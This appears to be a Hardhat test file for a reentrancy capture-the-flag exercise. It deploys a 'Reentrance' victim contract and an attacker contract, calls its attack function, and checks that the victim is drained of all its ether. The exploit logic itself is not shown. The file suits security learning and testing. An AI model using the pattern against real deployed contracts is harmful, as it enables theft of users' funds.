const {
    time,
    loadFixture,
} = require("@nomicfoundation/hardhat-network-helpers");
const { anyValue } = require("@nomicfoundation/hardhat-chai-matchers/withArgs");
const { expect } = require("chai");
const { ethers } = require("hardhat");

const NAME = "Reentrance";

describe(NAME, function () {
    async function setup() {
        const [owner, attackerWallet] = await ethers.getSigners();

        const VictimFactory = await ethers.getContractFactory(NAME);
        const victimContract = await VictimFactory.deploy();

        return { owner, victimContract, attackerWallet };
    }

    describe("exploit", async function () {
        let owner, victimContract, attackerWallet, attackerContract;
        before(async function () {
            ({ owner, victimContract, attackerWallet } = await loadFixture(setup));
        })

        it("conduct your attack here", async function () {
            const AttackerFactory = await ethers.getContractFactory("Solution9");
            attackerContract = await AttackerFactory.connect(attackerWallet).deploy(victimContract.address);

            let accounts = await ethers.getSigners();
            let account = await accounts[3].getAddress();
            await victimContract.connect(accounts[3]).donate(account, {value: ethers.utils.parseEther("1")});
            await attackerContract.connect(attackerWallet).attack({value: ethers.utils.parseEther("1")});
        });

        after(async function () {
            expect(await ethers.provider.getBalance(victimContract.address)).to.be.equal(0);
            expect(await ethers.provider.getBalance(attackerContract.address)).to.be.equal(ethers.utils.parseEther("2"));
        });
    });
});